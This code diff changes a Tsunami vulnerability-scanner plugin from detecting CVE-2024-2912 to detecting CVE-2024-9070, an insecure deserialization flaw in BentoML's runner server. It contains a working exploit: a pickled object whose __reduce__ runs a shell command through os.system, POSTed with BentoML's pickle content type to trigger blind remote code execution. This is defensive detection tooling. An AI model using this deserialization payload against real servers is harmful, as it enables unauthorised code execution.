@@ -1,5 +1,3 @@
-"""A Tsunami plugin for detecting CVE-2024-2912."""
-
 # Copyright 2024 Google LLC
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
@@ -13,12 +11,11 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
-
+"""A Tsunami plugin for detecting CVE-2024-9070."""
 import pickle
 import time
-
 from absl import logging
-
+import requests
 from google.protobuf import timestamp_pb2
 import tsunami_plugin
 from common.data import network_endpoint_utils
@@ -32,17 +29,16 @@ import payload_generator_pb2 as pg
 import plugin_representation_pb2
 import vulnerability_pb2
 
-
 _VULN_DESCRIPTION = (
     'The BentoML framework is vulnerable to an insecure deserialization issue'
     ' that can be exploited by sending a single POST request to any valid'
-    ' endpoint. The impact of this is remote code execution.The affected'
-    ' versions are between 1.2.0 and 1.2.4.'
+    ' endpoint of the runner server.The impact of this is remote code'
+    ' execution.'
 )
 _SLEEP_TIME_SEC = 20
 
 
-class Cve20242912Detector(tsunami_plugin.VulnDetector):
+class Cve20249070Detector(tsunami_plugin.VulnDetector):
   """A TsunamiPlugin that detects RCE on the BentoML target."""
 
   def __init__(
@@ -52,7 +48,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
     self.payload_generator = payload_generator
 
   def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
-    """Defines the PluginDefinition for Cve20242912Detector.
+    """Defines the PluginDefinition for Cve20249070Detector.
 
     Returns:
       The PluginDefinition used for the Tsunami engine to identify this plugin.
@@ -60,10 +56,10 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
     return tsunami_plugin.PluginDefinition(
         info=plugin_representation_pb2.PluginInfo(
             type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
-            name='Cve20242912VulnDetector',
+            name='Cve20249070VulnDetector',
             version='1.0',
             description=_VULN_DESCRIPTION,
-            author='secureness (nosecureness@gmail.com)',
+            author='VickyTheViking',
         )
     )
 
@@ -83,7 +79,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
       A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
       scanning target.
     """
-    logging.info('Cve20242912Detector starts detecting.')
+    logging.info('Cve20249070Detector starts detecting.')
     vulnerable_services = [
         service
         for service in matched_services
@@ -118,9 +114,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
     request = HttpRequest.get(url).with_empty_headers().build()
     try:
       response = self.http_client.send(request, network_service)
-      return (
-          '<title>BentoML Prediction Service</title>' in response.body_string()
-      )
+      return 'Method Not Allowed' in response.body_string()
     except Exception:  # pylint: disable=broad-exception-caught
       logging.exception('Unable to query %s', url)
     return False
@@ -130,28 +124,8 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
   ) -> bool:
     """Check if network service may result in RCE."""
 
-    # find an endpoint with "Service APIs" tag
-    paths_and_methods = []
-    url = self._BuildUrl(network_service, 'docs.json')
-    request = HttpRequest.get(url).with_empty_headers().build()
-    try:
-      response = self.http_client.send(request, network_service)
-      for path_name in response.body_json()['paths']:
-        for http_method in response.body_json()['paths'][path_name]:
-          for tags in response.body_json()['paths'][path_name][http_method][
-              'tags'
-          ]:
-            if tags == 'Service APIs':
-              paths_and_methods.append([path_name, http_method])
-    except Exception:  # pylint: disable=broad-exception-caught
-      logging.exception('Unable to query %s', url)
-
-    if len(paths_and_methods) == 0:
-      # there are no Service APIs to exploit
-      return False
-
     config = pg.PayloadGeneratorConfig(
-        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
+        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE,
         interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
         execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
     )
@@ -162,36 +136,37 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
     class Payload(object):
 
       def __reduce__(self):
-        import os  # pylint: disable=g-import-not-at-top
+        import os
 
         return os.system, (f'/bin/sh -c "{payload.get_payload()}"',)
 
     rce_command = pickle.dumps(Payload())
-    responses_body = []
-    for path_and_method in paths_and_methods:
-      url = self._BuildUrl(network_service, path_and_method[0])
-      request = (
-          HttpRequest.builder()
-          .set_method(path_and_method[1].upper())
-          .set_url(url)
-          .set_headers(
-              HttpHeaders.builder()
-              .add_header('Content-Type', 'application/vnd.bentoml+pickle')
-              .build()
-          )
-          .set_request_body(rce_command)
-          .build()
+    url = self._BuildUrl(network_service, '/')
+    request = (
+        HttpRequest.builder()
+        .set_method('POST')
+        .set_url(url)
+        .set_headers(
+            HttpHeaders.builder()
+            .add_header('Content-Type', 'application/vnd.bentoml.pickled')
+            .add_header('args-number', '3')
+            .build()
+        )
+        .set_request_body(rce_command)
+        .build()
+    )
+    try:
+      self.http_client.modify().set_timeout_sec(1).build().send(
+          request, network_service
       )
-      try:
-        response = self.http_client.send(request, network_service)
-        responses_body.append(response.body)
-      except Exception:  # pylint: disable=broad-exception-caught
-        logging.exception('Unable to query %s', url)
+    except requests.exceptions.ReadTimeout:  # pylint: disable=broad-exception-caught
+      # timeout is expected here because server won't return anything
+      pass
+    except Exception:  # pylint: disable=broad-exception-caught
+      logging.exception('Unable to query %s', url)
+
     time.sleep(_SLEEP_TIME_SEC)
-    for response_body in responses_body:
-      if payload.check_if_executed(response_body):
-        return True
-    return False
+    return payload.check_if_executed()
 
   def _BuildUrl(
       self, network_service: tsunami_plugin.NetworkService, vulnerable_path
@@ -222,12 +197,21 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
         detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
         vulnerability=vulnerability_pb2.Vulnerability(
             main_id=vulnerability_pb2.VulnerabilityId(
-                publisher='TSUNAMI_COMMUNITY', value='CVE_2024_2912'
+                publisher='TSUNAMI_COMMUNITY', value='CVE_2024_9070'
             ),
+            related_id=[
+                vulnerability_pb2.VulnerabilityId(
+                    publisher='CVE', value='CVE-2024-9070'
+                )
+            ],
             severity=vulnerability_pb2.Severity.CRITICAL,
-            title='BentoML Insecure Deserialization RCE (CVE-2024-2912)',
+            title=(
+                'BentoML Insecure Deserialization RCE (CVE-2024-9070) for'
+                ' Runner Server'
+            ),
             recommendation=(
-                'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
+                'Users should not expose the bentoml Runner Server endpoints to'
+                ' untrusted environments.'
             ),
             description=_VULN_DESCRIPTION,
         ),
